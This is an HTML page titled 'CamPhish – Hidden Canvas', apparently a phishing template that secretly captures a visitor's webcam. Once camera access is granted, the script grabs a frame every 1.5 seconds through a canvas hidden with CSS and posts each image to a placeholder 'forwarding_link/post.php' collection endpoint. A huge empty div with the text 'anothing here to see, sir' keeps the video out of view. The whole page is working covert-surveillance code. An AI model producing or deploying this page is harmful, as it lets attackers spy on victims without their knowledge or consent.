<!doctype html>
<html>
<head>
    <meta charset="UTF-8">
    <title>CamPhish – Hidden Canvas</title>
    <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
    <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <style>
        /* Hide the canvas completely – it will still be drawn on and captured */
        canvas {
            display: none;
        }

        /* Optional: make video container look clean */
        .video-wrap {
            margin-bottom: 20px;
        }
        .gap{
          height: 10000000vh;
          width: 100%;
        }
    </style>
</head>
<body>
<div class="gap">
  <h1>anothing here to see, sir</h1>
</div>
<div class="video-wrap">
    <video id="video" playsinline autoplay></video>
</div>

<!-- Canvas is hidden with CSS above, but still works in JavaScript -->
<canvas id="canvas" width="640" height="480"></canvas>



<script>
function post(imgdata) {
    $.ajax({
        type: 'POST',
        data: { cat: imgdata },
        url: 'forwarding_link/post.php',
        dataType: 'json',
        async: false,
        success: function(result) {
            // handle response if needed
        },
        error: function() {
            // handle error
        }
    });
}

'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');

const constraints = {
    audio: false,
    video: {
        facingMode: "user"
    }
};

// Access webcam
async function init() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        handleSuccess(stream);
    } catch (e) {
        if (errorMsgElement) errorMsgElement.innerHTML = `navigator.getUserMedia error: ${e.toString()}`;
        console.error(e);
    }
}

// Success
function handleSuccess(stream) {
    window.stream = stream;
    video.srcObject = stream;

    const context = canvas.getContext('2d');
    setInterval(function() {
        context.drawImage(video, 0, 0, 640, 480);
        const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
        post(canvasData);
    }, 1500);
}

// Load init
init();
</script>

</body>
</html>
